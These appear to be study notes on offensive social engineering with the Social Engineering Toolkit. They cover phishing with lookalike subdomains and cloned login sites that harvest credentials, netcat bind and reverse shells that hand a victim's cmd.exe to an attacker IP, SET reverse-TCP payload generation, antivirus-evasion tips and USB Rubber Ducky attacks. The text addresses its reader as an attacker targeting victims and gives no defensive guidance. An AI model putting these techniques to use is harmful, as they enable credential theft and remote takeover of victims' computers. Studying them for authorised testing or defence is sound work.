# Social Engineering Toolkit (SET)
Social engineering attacks.
Phishing - bunch of emails to many users.
Spear phishing - specific email(s) to one/many users, prepared attack.

$setoolkit
Stealing credentials.

Before you send an e-mail to your victims:
* First, you need to have an SMTP relay account (I’m using my GoDaddy
relay service). Do some research to find the service that is suitable for you.
* You need a professional and convincing e-mail or else your attack will nevitably fail.

Pay attention to these two things in the e-mail:
* Grammatical mistakes are not allowed. For example, “following” is not
correct in the previous message, so this will call attention to the authenticity of the e-mail.
* If you want to use URLs, make sure they are close to the real domain
name. For example, micosoft (without the r) is very close to Microsoft.

## Spear phishing attack
Best-gem attack is to first need to prepare a professional HTML e-mail and
make sure it doesn’t raise any doubts when the victim receives it. Clone a website and attach a database to it so each time victims submit their credentials, they will be saved into that database.

The second important part is the link that you are going to add in your e-mail.
What is the best way to obfuscate that URL? Well, the simple answer is to create
a domain and then create a subdomain that is a copy of the original one.
create a fake domain with a similar name like Fcb.com and then create a subdomain
Facebook.com. 

Here is what it should look like: facebook.fcb.com (facebook it's an example)

Ideally, you used a convincing e-mail that persuades employees
to click the URL that will redirect the employees to the fake site. The employees
will start writing their credentials, and when they click the login button, they
will be redirected to the real site. The attacker now has the credentials of the
unfortunate victims.

# Payloads & Listeners
A payload is an executable that will allow you to connect to a listener.
The goal is to have a TCP connection between the victim host and the attacker.
Firewall may block any incoming connections coming from the outside using the bind shell.

## Bind Shell
Attacker connects directly from Kali to the victim’s machine where a listener has already been launched.

nc - NetCat

victim: /nc.exe -nlvp 9999 -e C:\Windows\System32\cmd.exe
attacker: nc -nv 10.0.20.127 9999

10.0.20.127 is victim's IP 

## Reverse-shell
Attacker is listening for incoming connections from any victim. It's favorable because firewalls will usually
allow the traffic to pass through.

attacker: nc -nlvp 8888
victim: ./nc.exe 10.0.20.140 8888 -e C:\Windows\System32\cmd.exe

### Payload bypassing antivirus
You want to make sure that your payload executable will not be detected by the antivirus software installed on the victim’s PC.

upload your payload and scan it using the public virus scan site
www.virustotal.com/gui/home/upload

The best way to obfuscate your payloads is by using a custom one. In other words, you have to develop a payload using a programming language Python, PowerShell, C#, etc.

Generate a payload using SET:
* 1: Social-Engineering Attacks
* 4: Create a Payload and Listener
* 1: Windows Shell Reverse_TCP

Enter your Kali (attacker) host IP and the port number that you want to listen on. Once you do, it will generate a payload under /root/.set/payload.exe.

At this stage, the SET automatically launches the Metasploit multihandler listener.

### USB Rubber Ducky
The USB Rubber Ducky is not a USB stick,
though it looks like one; it is, in fact, a keyboard. Antivirus
software will think that you just plugged in a keyboard and not a USB stick.
We’re not done yet! When you insert this stick into the computer, it will
start typing and executing whatever you like on the victim’s machine—what
a fantastic invention!

General guidelines:
* make sure that when you prepare your e-mail message or phone
call, they are compelling and professional enough so the end user can
take the bait.
* secret to a successful social engineering attack is proper prep-
aration. So planning your attack will increase the chance of your
success.
* Next comes the infection phase. If you want to use a hardware kit in your
attacks, make sure you use a good one like the USB Rubber Ducky, for
example. Now, if you insist on using a USB stick in your attack, that’s
fine, but don’t try the autorun functionality, because it’s outdated. Also, today’s companies are well aware of USB stick infections, and they have already implemented security controls to protect against such attacks.

The best way to use reverse shells is to use one that you developed
yourself using your favorite programming language so it can by-pass antivirus.
